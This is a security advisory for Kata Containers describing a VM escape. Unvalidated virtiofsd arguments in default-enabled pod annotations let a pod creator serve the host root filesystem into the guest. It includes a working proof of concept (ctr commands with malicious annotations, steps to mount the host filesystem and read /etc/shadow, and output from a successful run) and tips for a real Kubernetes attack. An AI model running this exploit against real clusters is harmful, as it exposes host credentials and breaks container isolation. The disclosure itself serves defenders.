# [M] Kata Containers have VM Escape via virtiofsd Argument Injection through Default-Enabled Pod Annotations

## Summary
Severity: Medium
Advisory: GHSA-rr59-xxvx-96qr
CVE: CVE-2026-44210
CWE: CWE-88
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:N/SC:H/SI:H/SA:H/E:P (CVSS_V4)
Published: 2026-05-26
Source: https://github.com/advisories/GHSA-rr59-xxvx-96qr
Type: github-advisory

## Affected
- Go: `github.com/kata-containers/kata-containers` — affected >=0 <0.0.0-20260519062212-ffa59ce3aa78

## Details
## Summary

Kata Containers ships with a default configuration that allows pod creators to inject arbitrary command-line arguments into the virtiofsd process through the `io.katacontainers.config.hypervisor.virtio_fs_extra_args` pod annotation. By injecting `-o source=/` along with `--no-announce-submounts` and `--sandbox=none`, an attacker can override the virtiofsd shared directory to serve the entire host root filesystem into the guest VM. Combined with the `kernel_params` annotation (also enabled by default) to activate the agent debug console, the attacker can mount the host filesystem from inside the VM and read or write any file on the host, including /etc/shadow.

## Details

The default Kata configuration at configuration.toml line 1 contains:

```
enable_annotations = ["enable_iommu", "virtio_fs_extra_args", "kernel_params", "kernel_verity_params"]
```

Both `virtio_fs_extra_args` and `kernel_params` are enabled out of the box. The annotation name is checked against this allowlist, but the annotation value (the actual arguments) is never validated or filtered.

In utils.go at line 981, the runtime parses the annotation value as a JSON string array and appends it directly to the virtiofsd arguments:

```go
if value, ok := ocispec.Annotations[vcAnnotations.VirtioFSExtraArgs]; ok {
    var parsedValue []string
    err := json.Unmarshal([]byte(value), &parsedValue)
    // ...
    sbConfig.HypervisorConfig.VirtioFSExtraArgs = append(
        sbConfig.HypervisorConfig.VirtioFSExtraArgs, parsedValue...)
}
```

In virtiofsd.go at line 183-198, the runtime builds the virtiofsd command line with `--shared-dir=<kata_managed_path>` first, then appends the extra args:

```go
args := []string{
    "--syslog",
    "--cache=" + v.cache,
    "--shared-dir=" + v.sourcePath,
    fmt.Sprintf("--fd=%v", FdSocketNumber),
}
if len(v.extraArgs) != 0 {
    args = append(args, v.extraArgs...)
}
```

The virtiofsd binary (Rust, from gitlab.com/virtio-fs/virtiofsd) supports a compatibility option `-o source=PATH` that overrides the `--shared-dir` value. This is processed after clap argument parsing, in the `parse_compat()` function at main.rs:462:

```rust
["source", value] => opt.shared_dir = Some(value.to_string()),
```

Because `-o source=/` is appended after `--shared-dir=<kata_path>`, it overrides the shared directory to `/`. The virtiofsd process then serves the entire host root filesystem through the virtio-fs device.

Additionally, virtiofsd's `--announce-submounts` flag (set by default) causes the guest kernel to create FUSE automounts for bind mounts within the shared directory. When the shared directory is `/`, this produces automounts that shadow the root directory listing. Injecting `--no-announce-submounts` disables this behavior and exposes the true host root directory contents through the kataShared virtiofs mount.

The `kernel_params` annotation is used to inject `agent.debug_console agent.debug_console_vport=1026` into the VM kernel command line. This enables a root shell inside the VM through the kata-runtime exec command. From this shell, the attacker mounts the kataShared virtiofs filesystem and accesses host files directly.

## Rootfs bridge (PoC artifact, not a real constraint)

When virtiofsd uses `-o source=/` to serve the host root, the Kata agent looks for the container rootfs at `/<container-id>/rootfs` relative to the virtiofs root. The PoC pre-creates this directory on the host to keep the demonstration self-contained with ctr.

In a real Kubernetes attack, there are several ways to satisfy this without hostPath volumes. An initContainer that runs before the target container can create the directory. Alternatively, the attacker can set up a second pod that writes to a shared persistent volume mounted on the host. The rootfs bridge is a PoC convenience, not a limitation of the vulnerability itself.

## Impact

An attacker who can create pods on a Kubernetes cluster using Kata Containers with default configuration can:

- Read any file on the host, including /etc/shadow, SSH private keys, and service credentials
- Write to any file on the host, enabling persistent backdoors, cron jobs, or binary replacement
- Access other containers' data through the host filesystem
- Compromise the Kubernetes control plane if it runs on the same host

## Steps to reproduce

Tested on a bare metal server (AMD Ryzen 5 3600, Ubuntu 24.04, kernel 6.8.0-100-generic) with Kata Containers 3.28.0 installed from the official release tarball.

1. Install Kata Containers 3.28.0 and configure containerd. Verify that the default configuration has virtio_fs_extra_args in enable_annotations.

2. Pull a container image:

```
ctr image pull docker.io/library/alpine:latest
```

3. Run the PoC script below, or follow the manual steps:

Manual steps:

a. Extract a container rootfs and create the rootfs bridge (replace $SB_ID with your container name):

```
SB_ID="poc-exploit"
mkdir -p /$SB_ID/rootfs

# Extract alpine rootfs from OCI image
mkdir -p /tmp/oci-extract
ctr image export /tmp/oci.tar docker.io/library/alpine:latest
tar xf /tmp/oci.tar -C /tmp/oci-extract
IDX=$(jq -r '.manifests[0].digest' /tmp/oci-extract/index.json | sed 's/sha256://')
MFT=$(jq -r '.manifests[] | select(.platform.architecture=="amd64") | .digest' \
    "/tmp/oci-extract/blobs/sha256/$IDX" | head -1 | sed 's/sha256://')
LYR=$(jq -r '.layers[0].digest' "/tmp/oci-extract/blobs/sha256/$MFT" | sed 's/sha256://')
tar xzf "/tmp/oci-extract/blobs/sha256/$LYR" -C /$SB_ID/rootfs

rm -rf /tmp/oci-extract /tmp/oci.tar
```

b. Create a marker file on the host to prove access:

```
echo "HOST_ESCAPE_PROOF_$(date)" > /root/.poc-marker
```

c. Start the container with the malicious annotations:

```
ctr run \
  --runtime io.containerd.kata.v2 \
  --annotation 'io.katacontainers.config.hypervisor.virtio_fs_extra_args=["--sandbox=none","--seccomp=none","-o","source=/","--no-announce-submounts"]' \
  --annotation 'io.katacontainers.config.hypervisor.kernel_params=agent.debug_console agent.debug_console_vport=1026' \
  docker.io/library/alpine:latest $SB_ID \
  sleep 3600 &
```

Wait 20-30 seconds for the VM to start. Verify with `ctr task ls`.

d. Enter the VM through the debug console:

```
/opt/kata/bin/kata-runtime exec $SB_ID
```

e. Inside the VM, mount the host filesystem and read host files:

```
mkdir -p /tmp/hostfs
mount -t virtiofs kataShared /tmp/hostfs
cat /tmp/hostfs/etc/hostname
cat /tmp/hostfs/root/.poc-marker
head -3 /tmp/hostfs/etc/shadow
cat /tmp/hostfs/etc/os-release
ls /tmp/hostfs/opt/kata/bin/
```

f. Observe that /etc/hostname returns the host's hostname (not "localhost"), /etc/os-release shows the host OS (Ubuntu, not Alpine), /etc/shadow shows the host's password hashes, and /opt/kata/bin/ lists the Kata binaries installed on the host.

4. Clean up:

```
ctr task kill $SB_ID --signal SIGKILL
ctr container rm $SB_ID
umount /$SB_ID/rootfs
rm -rf /$SB_ID
```

## Proof of concept output

Below is the output from a successful run on Kata Containers 3.28.0. The host runs Ubuntu 24.04. The container image is Alpine Linux.

```
root@7a7325d5d804:/# mkdir -p /tmp/h && mount -t virtiofs kataShared /tmp/h
root@7a7325d5d804:/# echo DIRCOUNT:$(ls /tmp/h/ | wc -l)
DIRCOUNT:37
root@7a7325d5d804:/# echo HOSTNAME:$(cat /tmp/h/etc/hostname)
HOSTNAME:kata-poc
root@7a7325d5d804:/# echo OSREL:$(head -1 /tmp/h/etc/os-release)
OSREL:PRETTY_NAME="Ubuntu 24.04.3 LTS"
root@7a7325d5d804:/# cat /tmp/h/root/.kata-poc-marker
HOST_NS2_1776058192
root@7a7325d5d804:/# echo SHADOW:$(head -1 /tmp/h/etc/shadow)
SHADOW:root:*:17478:0:99999:7:::
root@7a7325d5d804:/# echo BOOT:$(ls /tmp/h/boot 2>/dev/null | head -3)
BOOT:System.map-6.8.0-100-generic System.map-6.8.0-107-generic config-6.8.0-100-generic
root@7a7325d5d804:/# echo KATA:$(ls /tmp/h/opt/kata/bin 2>/dev/null | head -3)
KATA:cloud-hypervisor containerd-shim-kata-v2 firecracker
```

The host's real hostname (kata-poc), OS (Ubuntu 24.04.3 LTS), /etc/shadow content, kernel files in /boot, and Kata binaries in /opt/kata/bin are all visible from inside the VM. The container itself runs Alpine, confirming this is the host filesystem and not the container's own filesystem.

## References
- https://github.com/kata-containers/kata-containers/security/advisories/GHSA-rr59-xxvx-96qr
- https://nvd.nist.gov/vuln/detail/CVE-2026-44210
- https://github.com/kata-containers/kata-containers/commit/ffa59ce3aa7877d067c9a372df0c329a23a01744
- https://github.com/kata-containers/kata-containers
